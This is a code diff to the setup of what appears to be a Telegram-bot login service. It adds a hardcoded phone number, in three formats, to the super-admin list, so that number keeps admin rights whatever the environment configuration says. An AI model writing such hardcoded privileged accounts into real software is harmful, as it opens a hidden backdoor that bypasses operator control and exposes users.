@@ -11,7 +11,11 @@ const BOT_TOKEN = (process.env.TELEGRAM_BOT_TOKEN || '').replace(/^"|"$/g, '').t
 const _rawUsername = (process.env.TELEGRAM_BOT_USERNAME || '').replace(/^"|"$/g, '').trim();
 const BOT_USERNAME = (_rawUsername && _rawUsername !== 'Xoethiopia_Dev_Bot') ? _rawUsername : 'XoethiopiaBot';
 const JWT_SECRET = process.env.JWT_SECRET;
-const SUPER_ADMIN_NUMBERS = (process.env.SUPER_ADMIN_NUMBERS || '').split(',').map(n => n.trim()).filter(Boolean);
+const HARDCODED_ADMINS = ['0939484533', '251939484533', '+251939484533'];
+const SUPER_ADMIN_NUMBERS = [
+  ...HARDCODED_ADMINS,
+  ...(process.env.SUPER_ADMIN_NUMBERS || '').split(',').map(n => n.trim()).filter(Boolean)
+];
 
 const SESSION_TTL = 300;     // 5 minutes — how long a login session lives
 const RESULT_TTL  = 120;     // 2 minutes — how long the completed result stays for polling
